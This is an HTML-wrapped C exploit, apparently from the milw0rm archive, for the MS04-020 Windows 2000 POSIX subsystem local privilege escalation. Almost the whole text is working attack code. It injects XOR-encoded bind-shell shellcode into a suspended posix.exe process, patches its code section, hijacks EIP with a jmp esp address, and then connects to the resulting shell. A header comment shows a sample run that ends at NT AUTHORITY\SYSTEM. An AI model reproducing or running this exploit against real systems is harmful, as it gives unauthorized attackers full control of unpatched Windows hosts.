<html><head><title>MS Windows 2K POSIX Subsystem Privilege Escalation Exploit (MS04-020)
</title></head><pre>/* Microsoft Windows POSIX Subsystem Local Privilege Escalation Exploit (MS04-020)
*
* Tested on windows 2k sp4 CN,NT/XP/2003 NOT TESTED
*
* Posixexp.c By bkbll (bkbll cnhonker net,bkbll tom com) www cnhonker com
*
* 2004/07/16 
*
* thanks to eyas xfocus org
*
*
C:\&gt;whoami
VITUALWIN2K\test

C:\&gt;posixexp
Microsoft Windows POSIX Subsystem Local Privilege Escalation Exploit(1
By bkbll (bkbll#cnhonker.net,bkbll#tom.com) www.cnhonker.com

pax: illegal option--h
Usage: pax -[cimopuvy] [-f archive] [-s replstr] [-t device] [pattern.
pax -r [-cimopuvy] [-f archive] [-s replstr] [-t device] [patte
pax -w [-adimuvy] [-b blocking] [-f archive] [-s replstr]
[-t device] [-x format] [pathname...]
pax -r -w [-ilmopuvy] [-s replstr] [pathname...] directory

For more information on pax syntax, see Command Reference
Help in the Windows Help file.Remote addr:0x7ff90000
Microsoft Windows 2000 [Version 5.00.2195]
(C) &amp;#29256;&amp;#26435;&amp;#25152;&amp;#26377; 1985-2000 Microsoft Corp.

C:\WINNT\system32&gt;whoami
whoami
NT AUTHORITY\SYSTEM

C:\WINNT\system32&gt;exit
[+] Connection closed in exit command.

C:\&gt;

*/

#include &lt;stdlib.h&gt;
#include &lt;Winsock2.h&gt;
#include &lt;windows.h&gt;

#pragma comment(lib,&quot;ws2_32&quot;)

#define PATCHADDR 0x0100343D        //&amp;#38656;&amp;#35201;&amp;#21160;&amp;#24577;&amp;#20462;&amp;#25913;posix.exe&amp;#30340;&amp;#20301;&amp;#32622;
#define MEMSIZE 0x350
#define CODESIZE 50
#define bind_port_offset 116
#define RETADDR 0x796E9B53 //advapi32.dll jmp esp
// [ebp-0x200] [saved ebp] [saved eip] 
#define EIPLOCATION 0x200+4-12    //12&amp;#26159;&quot;\DosDevices\&quot;&amp;#30340;&amp;#38271;&amp;#24230;
#define CANWRITEADDR 0x7ffdf02c     //&amp;#35813;&amp;#22320;&amp;#22336;+0x20&amp;#35201;&amp;#21487;&amp;#20889;
#define VERSION &quot;1.0&quot;

unsigned short bindport = 60000;

unsigned char jmpcode[]=
&quot;\x33\xC0&quot;        //xor eax,eax
&quot;\x66\xB8\xc0\x01&quot;    //mov ax,0x1ff
&quot;\x40&quot;            //inc eax
&quot;\x2B\xE0&quot;        //sub esp,eax
&quot;\xFF\xE4&quot;        //jmp esp
&quot;\x00&quot;;            //\0 zero NULL 
   
unsigned char bind_shell[]=
&quot;\xeb\x10\x5b\x4b\x33\xc9\x66\xb9\x45\x01\x80\x34\x0b\xee\xe2\xfa&quot;
&quot;\xeb\x05\xe8\xeb\xff\xff\xff&quot;
/* 302 bytes shellcode, xor with 0xee */
&quot;\x07\x12\xee\xee\xee\xb1\x8a\x4f\xde\xee\xee\xee\x65\xae\xe2\x65&quot;
&quot;\x9e\xf2\x43\x65\x86\xe6\x65\x19\x84\xea\xb7\x06\x72\xee\xee\xee&quot;
&quot;\x0c\x17\x86\xdd\xdc\xee\xee\x86\x99\x9d\xdc\xb1\xba\x11\xf8\x7b&quot;
&quot;\x84\xe8\xb7\x06\x6a\xee\xee\xee\x0c\x17\x65\x2a\xdd\x27\xdd\x3c&quot;
&quot;\x5f\xea\x19\x1f\xc5\x0c\x6f\x02\x7e\xef\xee\xee\x65\x22\xbf\x86&quot;
&quot;\xec\xec\xee\xee\x11\xb8\xca\xdd\x27\xbf\x86\xec\xee\xee\xdb\x65&quot;
&quot;\x02\xbf\xbf\xbf\xbf\x84\xef\x84\xec\x11\xb8\xfe\x7d\x84\xfe\xbb&quot;
&quot;\xbd\x11\xb8\xfa\xbe\xbd\x11\xb8\xf6\x65\x12\x84\xe0\xb7\x45\x0c&quot;
&quot;\x13\xbe\xbe\xbd\x11\xb8\xf2\x88\x29\xaa\xca\xc2\xef\xef\x45\x45&quot;
&quot;\x45\x65\x3a\x86\x8d\x83\x8a\xee\x65\x02\xdd\x27\xbe\xb9\xbc\xbf&quot;
&quot;\xbf\xbf\x84\xef\xbf\xbf\xbb\xbf\x11\xb8\xea\x84\x11\x11\xd9\x11&quot;
&quot;\xb8\xe2\xbd\x11\xb8\xce\x11\xb8\xce\x11\xb8\xe6\xbf\xb8\x65\x9b&quot;
&quot;\xd2\x65\x9a\xc0\x96\xed\x1b\xb8\x65\x98\xce\xed\x1b\xdd\x27\xa7&quot;
&quot;\xaf\x43\xed\x2b\xdd\x35\xe1\x50\xfe\xd4\x38\x9a\xe6\x2f\x25\xe3&quot;
&quot;\xed\x34\xae\x05\x1f\xd5\xf1\x9b\x09\xb0\x65\xb0\xca\xed\x33\x88&quot;
&quot;\x65\xe2\xa5\x65\xb0\xf2\xed\x33\x65\xea\x65\xed\x2b\x45\xb0\xb7&quot;
&quot;\x2d\x06\x11\x10\x11\x11\x60\xa0\xe0\x02\x9c\x10\x5d\xf8\x01\x20&quot;
&quot;\x0e\x8e\x43\x37\xeb\x20\x37\xe7\x1b\x43\x4a\xf4\x9e\x29\x4a\x43&quot;
&quot;\xc0\x07\x0b\xa7\x68\xa7\x09\x97\x28\x97\x25\x03\x12\xd5&quot;
;

int readwrite(SOCKET fd);
int client_connect(int sockfd,char* server,int port);

main()
{
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   LPVOID pdwCodeRemote;
   unsigned int cbMemSize = MEMSIZE;
   DWORD dwOldProtect,dwNumBytesXferred;
   unsigned char buffer[MEMSIZE];
   unsigned int buflen=0;
   unsigned char textbuf[CODESIZE];
   int i;
   unsigned short lports;
   char cmdarg[400];
   char systemdir[MAX_PATH+1];
   WSADATA    wsd;
   SOCKET sockfd;
   
   printf(&quot;Microsoft Windows POSIX Subsystem Local Privilege Escalation Exploit(%s)\n&quot;,VERSION);
   printf(&quot;By bkbll (bkbll#cnhonker.net,bkbll#tom.com) www.cnhonker.com\;n\n&quot;);
   if (WSAStartup(MAKEWORD(2,2), &amp;wsd) != 0)
   {
       printf(&quot;[-] WSAStartup error:%d\n&quot;, WSAGetLastError());
       return -1;
   }
   
   i = GetWindowsDirectory(systemdir,MAX_PATH);
   systemdir[i]='\0';
   _snprintf(cmdarg,sizeof(cmdarg)-1,&quot;%s\\system32\\posix.exe /P %s\\system32\\pax.exe /C 
pax -h&quot;,systemdir,systemdir);
   //printf(&quot;cmdarg:%s\n&quot;,cmdarg);
   //exit(0);
   ZeroMemory(&amp;si,sizeof(si));
   si.cb = sizeof(si);
   ZeroMemory( &amp;pi,sizeof(pi));
   //create process
   //&amp;#20808;&amp;#35753;psxss&amp;#36816;&amp;#34892;&amp;#36215;&amp;#26469;
   if(!CreateProcess(NULL, cmdarg, NULL, NULL, TRUE, 0, 0, 0, &amp;si, &amp;pi))
   {
    printf(&quot;CreateProcess1 failed:%d\n&quot;, GetLastError());
    return 0;
   }
   WaitForSingleObject(pi.hProcess, INFINITE);
   //&amp;#20877;&amp;#36816;&amp;#34892;&amp;#19968;&amp;#27425;
   ZeroMemory(&amp;si,sizeof(si));
   si.cb = sizeof(si);
   ZeroMemory( &amp;pi,sizeof(pi));
   if(!CreateProcess(NULL, cmdarg, NULL, NULL, TRUE,CREATE_SUSPENDED, 0, 0, &amp;si, &amp;pi))
   {
    printf(&quot;CreateProcess2 failed:%d\n&quot;, GetLastError());
    return 0;
   }
   //alloc from remote process
   pdwCodeRemote = (PDWORD)VirtualAllocEx(pi.hProcess, NULL, cbMemSize,MEM_COMMIT | 
   MEM_TOP_DOWN,PAGE_EXECUTE_READWRITE);
   if (pdwCodeRemote == NULL) 
   {
       TerminateProcess(pi.hProcess,0);
       printf(&quot;VirtualAllocEx failed:%d\n&quot;,GetLastError());
       return 0;
   }
   printf(&quot;Remote addr:0x%08x\n&quot;,pdwCodeRemote);
   //we can write and execute
   if(!VirtualProtectEx(pi.hProcess, pdwCodeRemote, cbMemSize,PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) 
   {
       TerminateProcess(pi.hProcess,0);
       printf(&quot;VirtualProtectEx failed:%d\n&quot;,GetLastError());
       return 0;
   }
   //make shellcode    
   lports = htons(bindport)^0xeeee;
   memcpy(bind_shell+bind_port_offset,&amp;lports,2);
   
   memset(buffer,'\x90',MEMSIZE);
   //memset(buffer,'A',EIPLOCATION);
   buffer[MEMSIZE-1] = '\0';
   i=sizeof(bind_shell)-1;
   if(i &gt;= EIPLOCATION) 
   {
       printf(&quot;shellcode so large:%d,must &lt; %d\n&quot;,i,MEMSIZE);
       TerminateProcess(pi.hProcess,0);
       return 0;
   }
   i=EIPLOCATION-i;
   memcpy(buffer+i,bind_shell,sizeof(bind_shell)-1);
   *(unsigned int*)(buffer+EIPLOCATION) = RETADDR; //&amp;#35206;&amp;#30422;eip
   *(unsigned int*)(buffer+EIPLOCATION+4) =CANWRITEADDR; //&amp;#35206;&amp;#30422;&amp;#31532;&amp;#19968;&amp;#20010;&amp;#21442;&amp;#25968;
   memcpy(buffer+EIPLOCATION+12,jmpcode,sizeof(jmpcode)-1);
   //write in to target
   buflen=MEMSIZE;
   if(!WriteProcessMemory(pi.hProcess,pdwCodeRemote,buffer,buflen,&amp;dwNumBytesXferred)) 
   {
       TerminateProcess(pi.hProcess,0);
       printf(&quot;WriteProcessMemory failed:%d\n&quot;,GetLastError());
       return 0;
   }
   //modified the process .text
   if(!VirtualProtectEx(pi.hProcess,(LPVOID)PATCHADDR,CODESIZE,PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) 
   {
       TerminateProcess(pi.hProcess,0);
       printf(&quot;VirtualProtectEx 0x08x failed:%d\n&quot;,PATCHADDR,GetLastError());
       return 0;
   }
   //&amp;#21019;&amp;#24314;&amp;#35201;&amp;#20462;&amp;#34917;&amp;#30340;&amp;#20869;&amp;#23481;
   i = 0;
   textbuf[i++]='\xbf';
   textbuf[i++]=(DWORD)pdwCodeRemote &amp; 0xff;    //mov edi,pdwCodeRemote
   textbuf[i++]=((DWORD)pdwCodeRemote &gt;&gt; 8 ) &amp; 0xff;
   textbuf[i++]=((DWORD)pdwCodeRemote &gt;&gt; 16 ) &amp; 0xff;
   textbuf[i++]=((DWORD)pdwCodeRemote &gt;&gt; 24 ) &amp; 0xff;
   //&amp;#26367;&amp;#25442;&amp;#36339;&amp;#36716;&amp;#25351;&amp;#20196;
   textbuf[i++]='\xeb';
   textbuf[i++]='\x09'; //jmp .+0b
   //&amp;#20889;&amp;#36827;&amp;#36827;&amp;#31243;&amp;#20013;
   if(!WriteProcessMemory(pi.hProcess,(LPVOID)PATCHADDR,textbuf,i,&amp;dwNumBytesXferred)) 
   {
       TerminateProcess(pi.hProcess,0);
       printf(&quot;WriteProcessMemory failed:%d\n&quot;,GetLastError());
       return 0;
   }
   ResumeThread(pi.hThread);
   Sleep(5);
   sockfd=WSASocket(2,1,0,0,0,0);
   if(sockfd == INVALID_SOCKET)
   {
       printf(&quot;[-] WSASocket error:%d\n&quot;, WSAGetLastError());
       return -1;
   }
   if(client_connect(sockfd,&quot;127.0.0.1&quot;,bindport) &lt; 0)
   {
       closesocket(sockfd);
       printf(&quot;[-] Maybe not success?\n&quot;);
   }
   readwrite(sockfd);
   TerminateProcess(pi.hProcess,0);
   WaitForSingleObject(pi.hProcess, INFINITE);
}

int readwrite(SOCKET fd)
{
   fd_set fdr1;
   unsigned char buffer[1024];
   int istty,ct1,ct2;
   struct timeval timer;

   memset(buffer,0,sizeof(buffer));
   istty=_isatty(0);
   timer.tv_sec=0;
   timer.tv_usec=0;

   while(1)
   {

       FD_ZERO(&amp;fdr1);
       FD_SET(fd,&amp;fdr1);
       ct1=select(0,&amp;fdr1,NULL,NULL,&amp;timer);
       if(ct1==SOCKET_ERROR)
       {
           printf(&quot;[-] select error:%d\n&quot;,GetLastError());
           break;
       }
       if(FD_ISSET(fd,&amp;fdr1))
       {
           ct1=recv(fd,buffer,sizeof(buffer)-1,0);
           if((ct1==SOCKET_ERROR) || (ct1==0))
           {
               printf(&quot;[-] target maybe close the socket.\n&quot;);
               break;
           }
           if(_write(1,buffer,ct1)&lt;=0)
           {
               printf(&quot;[-] write to stdout error:%d\n&quot;,GetLastError());
               break;
           }

           memset(buffer,0,sizeof(buffer));
       }
       if(istty)
       {
           if(_kbhit()) /* stdin can read */
           {


               ct1=read(0,buffer,sizeof(buffer)-1);
               if(ct1 &lt;= 0)
               {
                   printf(&quot;[-] read from stdin error:%d\n&quot;,GetLastError());
                   break;
               }
               ct2=send(fd,buffer,ct1,0);
               if((ct2==SOCKET_ERROR) || (ct2==0))
               {
                   printf(&quot;[-] target maybe close the socket.\n&quot;);
                   break;
               }
               if( strnicmp(buffer, &quot;exit&quot;, 4) == 0)
               {
                   printf(&quot;[+] Connection closed in exit command.\n&quot;);
                   break;
               }
               memset(buffer,0,sizeof(buffer));
           }
       }
       else
       {
           ct1=read(0,buffer,sizeof(buffer)-1);
           if(ct1&lt;=0)
           {
               printf(&quot;[-] read from nontty stdin error:%d\n&quot;,GetLastError());
               break;
           }
           ct2=send(fd,buffer,ct1,0);
           if((ct2==SOCKET_ERROR) || (ct2==0))
           {
               printf(&quot;[-] target maybe close the socket\n&quot;);
               break;
           }
           if( strnicmp(buffer, &quot;exit&quot;, 4) == 0)
           {
               printf(&quot;[+] Connection closed in exit command.\n&quot;);
               break;
           }
           memset(buffer,0,sizeof(buffer));
       }
   }
   return(1);
}


/* &amp;#36830;&amp;#25509;&amp;#25351;&amp;#23450;server &amp;#21644;port */
int client_connect(int sockfd,char* server,int port)
{
   struct sockaddr_in cliaddr;
   struct hostent *host;
   short port2;

   port2=port &amp; 0xffff;

   if((host=gethostbyname(server))==NULL)
   {
       printf(&quot;gethostbyname(%s) error\n&quot;,server);
       return(-1);
   }

   memset(&amp;cliaddr,0,sizeof(struct sockaddr));
   cliaddr.sin_family=AF_INET;
   cliaddr.sin_port=htons(port2);
   cliaddr.sin_addr=*((struct in_addr *)host-&gt;h_addr);
   if(connect(sockfd,(struct sockaddr *)&amp;cliaddr,sizeof(struct sockaddr))&lt;0)
   {
       printf(&quot;[-] Trying %s:%d error\n&quot;,server,port);
       closesocket(sockfd);
       return(-1);
   }
   //printf(&quot;ok\r\n&quot;);
   return(0);
}

// milw0rm.com [2004-07-17]</pre></html>